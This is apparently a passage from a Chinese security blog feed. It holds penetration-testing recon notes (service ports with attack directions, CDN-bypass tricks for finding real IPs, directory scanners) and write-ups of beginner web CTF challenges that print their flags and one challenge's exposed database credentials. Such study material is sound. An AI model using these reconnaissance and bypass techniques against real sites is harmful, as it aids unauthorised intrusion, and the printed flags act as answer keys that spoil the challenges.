<h3 id="数据库服务端口"><a href="#数据库服务端口" class="headerlink" title="数据库服务端口"></a>数据库服务端口</h3> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">端口号                  端口说明                    攻击方向</span><br><span class="line">3306                    MySQL                   注入、提权、爆破</span><br><span class="line">1433                  MSSQL数据库               注入、提权、SA弱口令、爆破</span><br><span class="line">1521                  Oracle数据库              TNS爆破、注入、反弹Shell</span><br><span class="line">5432                  PostgreSQL数据库          爆破、注入、弱口令</span><br><span class="line">27017/27018            MongoDB                  爆破、未授权访问</span><br><span class="line">6379                   Redis数据库              可尝试未授权访问、弱口令爆破</span><br><span class="line">5000                 SysBase/DB2数据库              爆破、注入</span><br></pre></td></tr></table></figure>
<h3 id="邮件服务端口"><a href="#邮件服务端口" class="headerlink" title="邮件服务端口"></a>邮件服务端口</h3> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">端口号                  端口说明                    攻击方向</span><br><span class="line">25                    SMTP邮件服务                  邮件伪造</span><br><span class="line">110                    POP3协议                    爆破、嗅探</span><br><span class="line">143                    IMAP协议                      爆破</span><br></pre></td></tr></table></figure>
<h3 id="网络常见协议端口"><a href="#网络常见协议端口" class="headerlink" title="网络常见协议端口"></a>网络常见协议端口</h3> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">端口号                  端口说明                    攻击方向</span><br><span class="line">53                     DNS域名系统          允许区域传送、DNS劫持、缓存投毒、欺骗</span><br><span class="line">67/68                  DHCP服务                    劫持、欺骗</span><br><span class="line">161                    SNMP协议                  爆破、搜集目标内网信息</span><br></pre></td></tr></table></figure>
<h3 id="特殊服务端口"><a href="#特殊服务端口" class="headerlink" title="特殊服务端口"></a>特殊服务端口</h3> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">端口号                  端口说明                    攻击方向</span><br><span class="line">2181                  Zookeeper服务                未授权访问</span><br><span class="line">8069                  Zabbix服务                远程执行、SQL注入</span><br><span class="line">9200/9300            Elastissearch服务             远程执行</span><br><span class="line">11211                Memcache服务                  未授权访问</span><br><span class="line">512/513/514         Linux Rexec服务              爆破、Rlogin登陆</span><br><span class="line">873                    Rsync服务                 匿名访问、文件上传</span><br><span class="line">3690                   Svn服务                  Svn泄露、未授权访问</span><br><span class="line">50000              SAP Management Console          远程执行</span><br></pre></td></tr></table></figure>
<h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p>CMS扫描工具：Web指纹识别、WhatWeb、WhatRobo、椰树、轻量WEB指纹识别<br>BugScaner:<a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a><br>云悉指纹:<a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">http://www.yunsee.cn/finger.html</a><br>和WhatWeb:<a href="https://whatweb.net/" target="_blank" rel="noopener">https://whatweb.net/</a></p>
<h2 id="查找真实IP"><a href="#查找真实IP" class="headerlink" title="查找真实IP"></a>查找真实IP</h2><h3 id="目标服务器存在CDN"><a href="#目标服务器存在CDN" class="headerlink" title="目标服务器存在CDN"></a>目标服务器存在CDN</h3><p>CDN：内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。<br>即是一组在不同运营商之间的对接节点上的高速缓存服务器，把用户经常访问的静态数据资源直接缓存到节点服务器上，当用户再次请求时，会直接分发到在离用户最近的节点服务器上响应给用户。<br>渗透目标购买了CDN服务，直接ping目标的域名，得到的不是真正的目标Web服务器，只是最近一台目标节点的CDN服务器，所以无法直接得到目标的真实IP段范围</p>
<h3 id="判断目标是否用了CDN"><a href="#判断目标是否用了CDN" class="headerlink" title="判断目标是否用了CDN"></a>判断目标是否用了CDN</h3><p>①ping目标主域，观察域名解析情况<br>②在线网站：<a href="https://www.17ce.com" target="_blank" rel="noopener">https://www.17ce.com</a> ，对全国多地区的ping服务器操作，对比每个地区ping出的IP结果，查看IP是否一致，若一致则可能不存在CDN</p>
<h3 id="绕过CDN寻找真实IP"><a href="#绕过CDN寻找真实IP" class="headerlink" title="绕过CDN寻找真实IP"></a>绕过CDN寻找真实IP</h3><p>当目标使用了CDN时，就需要绕过CDN寻找目标的真实IP<br>①内部邮箱源：一般内部的邮箱系统没有经过CDN解析，ping这个邮箱服务器的域名，就可以查找到目标的真实IP<br>②扫描网站测试文件：phpinfo和test<br>③分站域名：由于主站访问量大，都会挂CDN，但是分站可能没有挂CDN，可通过ping二级域名获取分站IP<br>④国外访问：国内的CDN只对国内用户的访问加速，而国外的CDN就不一定了。通过国外在线代理网站App Synthetic Monitor:<a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">https://asm.ca.com/en/ping.php</a> 访问，可能会得到真实IP<br>⑤查询域名解析记录：也许目标以前没有用过CDN，可通过网站NETCRAFT:<a href="https://www.netcraft.com" target="_blank" rel="noopener">https://www.netcraft.com</a> 观察域名的IP历史记录，可以大致分析出目标的真实IP段<br>⑥若目标网站有自己的App,可以尝试利用Fiddler和Burpsuite抓取App的请求，找到真实IP<br>⑦绕过CloudFlare CDN查找真实IP：许多网站都使用CloudFlare提供的CDN服务，如果目标网站使用了CDN，则可尝试通过在线网站CloudFlareWatch:<a href="http://www.crimeflare.us/cfs.html#box" target="_blank" rel="noopener">http://www.crimeflare.us/cfs.html#box</a> 查询真实IP</p>
<h2 id="收集敏感目录文件"><a href="#收集敏感目录文件" class="headerlink" title="收集敏感目录文件"></a>收集敏感目录文件</h2><p>探测Web目录结构和隐藏的敏感文件，获取网站的后台管理界面、文件上传界面、甚至可能扫描出网站的源代码<br>网站目录扫描工具：DirBuster、御剑后台扫描珍藏版、wwwscan、Spinder.py、Sensitivefilescan、weakfilescan<br>WebScan：<a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a></p>
]]></content>
      <categories>
        <category>Web安全攻防-渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>安恒Web</title>
    <url>/post/bdf665a4.html</url>
    <content><![CDATA[<h2 id="贪食蛇"><a href="#贪食蛇" class="headerlink" title="贪食蛇"></a>贪食蛇</h2><p>一个网页版贪吃蛇游戏，查看网页源代码，在snake.js文件中发现需要达到2500分才会出现flag<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (me.snakeLength &gt; 2500)</span><br><span class="line">&#123;ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [<span class="string">'_'</span>]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: <span class="string">'_'</span> ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +<span class="string">'_'</span>) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ <span class="string">'_'</span>)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +<span class="string">'_'</span>)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +<span class="string">'_'</span>) [c^_^o];(ﾟДﾟ) [<span class="string">'c'</span>] = ((ﾟДﾟ)+<span class="string">'_'</span>) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [<span class="string">'o'</span>] = ((ﾟДﾟ)+<span class="string">'_'</span>) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [<span class="string">'c'</span>]+(ﾟДﾟ) [<span class="string">'o'</span>]+(ﾟωﾟﾉ +<span class="string">'_'</span>)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +<span class="string">'_'</span>) [ﾟｰﾟ] + ((ﾟДﾟ) +<span class="string">'_'</span>) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +<span class="string">'_'</span>) [ﾟΘﾟ]+((ﾟｰﾟ==3) +<span class="string">'_'</span>) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [<span class="string">'c'</span>]+((ﾟДﾟ)+<span class="string">'_'</span>) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [<span class="string">'o'</span>]+((ﾟｰﾟ==3) +<span class="string">'_'</span>) [ﾟΘﾟ];(ﾟДﾟ) [<span class="string">'_'</span>] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +<span class="string">'_'</span>) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+<span class="string">'_'</span>) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +<span class="string">'_'</span>) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +<span class="string">'_'</span>) [ﾟΘﾟ]+ (ﾟωﾟﾉ +<span class="string">'_'</span>) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=<span class="string">'\\'</span>; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +<span class="string">'_'</span>)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=<span class="string">'\"'</span>;(ﾟДﾟ) [<span class="string">'_'</span>] ( (ﾟДﾟ) [<span class="string">'_'</span>] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (<span class="string">'_'</span>);&#125;</span><br></pre></td></tr></table></figure><br>明显是一段颜文字，直接在控制台解码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">window[<span class="string">'flag'</span>] = <span class="string">'Flag&#123;6b4807273afdffc4426b790debcd2b96&#125;'</span>;</span><br><span class="line">console.log(<span class="string">"Flag&#123; hahahah wrong!! :(&#125;"</span>);</span><br></pre></td></tr></table></figure></p>
<h2 id="愤怒的管理员"><a href="#愤怒的管理员" class="headerlink" title="愤怒的管理员"></a>愤怒的管理员</h2><p>只有一句话Success in database connection!<br>查看robots.txt文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /include</span><br><span class="line">Disallow: /dbadmin</span><br></pre></td></tr></table></figure><br>分别查看这两个目录<br>在/include目录下有个db.phps链接<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define ( <span class="string">'Z_DB_NAME'</span>, <span class="string">'dbappweb1'</span> );</span><br><span class="line">define ( <span class="string">'Z_DB_USER'</span>, <span class="string">'dbappweb1_IJebj'</span> );</span><br><span class="line">define ( <span class="string">'Z_DB_PASSWORD'</span>, <span class="string">'dspnwU5WY4NuArxh'</span> );</span><br><span class="line">define ( <span class="string">'Z_DB_HOST'</span>, <span class="string">'localhost'</span> );</span><br><span class="line">define ( <span class="string">'Z_DB_CHARSET'</span>, <span class="string">'utf8'</span> );</span><br><span class="line"><span class="variable">$table_prefix</span> = <span class="string">'z_'</span>;</span><br></pre></td></tr></table></figure><br>看样子是一个数据库的登录名和登陆密码<br>进入/dbadmin目录<br>有一个登录框，刚好就用/include目录下的那个登陆信息尝试登陆，成功登陆<br>进入后似乎是一个数据库管理系统，在左侧有一列目录，在其中的flags目录中发现了<br>flag{7e01c19b66330b121c90f6ebcafe8231}</p>
<h2 id="你就是长不了"><a href="#你就是长不了" class="headerlink" title="你就是长不了"></a>你就是长不了</h2><p>给了一个输入框，要求输入长度大于10的字符串，结果最多只能输10位，查看源代码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;div class=<span class="string">"form-group"</span>&gt;</span><br><span class="line">	&lt;label&gt;又有输入框咯，但是，你能提交长于10个字符的内容么？&lt;/label&gt;</span><br><span class="line">	&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> class=<span class="string">"form-control"</span> name=<span class="string">"post"</span> maxlength=<span class="string">"10"</span>&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><br>将maxlength修改为大于10的值即可<br>flag{88c48ff4b554eca6c7f961490aea8373}</p>
<h2 id="你就是提交不了"><a href="#你就是提交不了" class="headerlink" title="你就是提交不了"></a>你就是提交不了</h2><p>一个输入框，一个提交按钮，输入框不可输入，提交按钮也不可点击，查看源代码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;form role=<span class="string">"form"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">	&lt;div class=<span class="string">"form-group"</span>&gt;</span><br><span class="line">		&lt;label&gt;提交He110w0r1d就能获得flag啦,够简单吧！&lt;/label&gt;</span><br><span class="line">		&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> class=<span class="string">"form-control"</span> name=<span class="string">"post"</span> disabled=<span class="string">"disabled"</span>&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;button <span class="built_in">type</span>=<span class="string">"submit"</span> class=<span class="string">"btn btn-default"</span> disabled=<span class="string">"disabled"</span>&gt;Submit&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><br>删除输入框和提交按钮的disable属性即可<br>flag{b0b237b92155c5ba0e0d90b1d01d8798}</p>
<h2 id="我的生日"><a href="#我的生日" class="headerlink" title="我的生日"></a>我的生日</h2><p>页面上有张哆啦A梦的照片，一个要求输入生日的输入框，一个输入验证码的输入框，百度哆啦A梦生日21120903<br>输入后拿到flag{6eabe3caaeccb77310b47e397bada813}</p>
<h2 id="input"><a href="#input" class="headerlink" title="input"></a>input</h2><p>在源代码中发现了一段js代码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">check</span></span>()&#123;</span><br><span class="line">        var flag = document.getElementById(<span class="string">"flag"</span>).value;</span><br><span class="line">        var str = <span class="string">"d84d9657e5e5e"</span> || 0;</span><br><span class="line">        var str = str + (<span class="string">"ad2ad3fe"</span> &amp;&amp; 2);</span><br><span class="line">        var str = str + <span class="string">"a2da9494b8"</span> + <span class="string">"ddea4fd4"</span>;</span><br><span class="line">        var str = str.split(<span class="string">""</span>).reverse().join(<span class="string">""</span>);</span><br><span class="line">        <span class="keyword">if</span> (str == flag)&#123;</span><br><span class="line">            alert(<span class="string">"恭喜你已经找到flag！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>分析这段代码，先从输入框拿到一个输入的字符串。对str进行操作，最终如果输入的字符串flag和str处理完后的结果一样的话，就会弹出   恭喜你已经找到flag！<br>那么只要得到str处理的最终结果，即就是flag<br>js在线运行：<a href="https://www.sojson.com/runjs.html" target="_blank" rel="noopener">https://www.sojson.com/runjs.html</a><br>不过处理完了需要把str显示出来，加一句输出语句即可<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var str = <span class="string">"d84d9657e5e5e"</span> || 0;</span><br><span class="line">var str = str + (<span class="string">"ad2ad3fe"</span> &amp;&amp; 2);</span><br><span class="line">var str = str + <span class="string">"a2da9494b8"</span> + <span class="string">"ddea4fd4"</span>;</span><br><span class="line">var str = str.split(<span class="string">""</span>).reverse().join(<span class="string">""</span>);</span><br><span class="line">document.write(str)</span><br></pre></td></tr></table></figure><br>运行结果是4df4aedd8b4949ad2a2e5e5e7569d48d</p>
<h2 id="刀塔"><a href="#刀塔" class="headerlink" title="刀塔"></a>刀塔</h2><p>用御剑后台扫描，出现了一个www.zip文件，打开后在flag.php中发现了<br>flag:{ef167fd977019c10e6aa761a419c5240} </p>
<h2 id="100块钱都不给我"><a href="#100块钱都不给我" class="headerlink" title="100块钱都不给我"></a>100块钱都不给我</h2><p>第一眼看到满屏幕字母很懵，这都啥玩意儿。看源代码，什么也没有发现<br>查看robots.txt协议，眼前一亮，啊哈<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /index.php1</span><br></pre></td></tr></table></figure><br>查看index.php1,有一段php代码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = isset(<span class="variable">$_GET</span>[<span class="string">'ctf'</span>]) ? <span class="variable">$_GET</span>[<span class="string">'ctf'</span>] : <span class="string">''</span>;</span><br><span 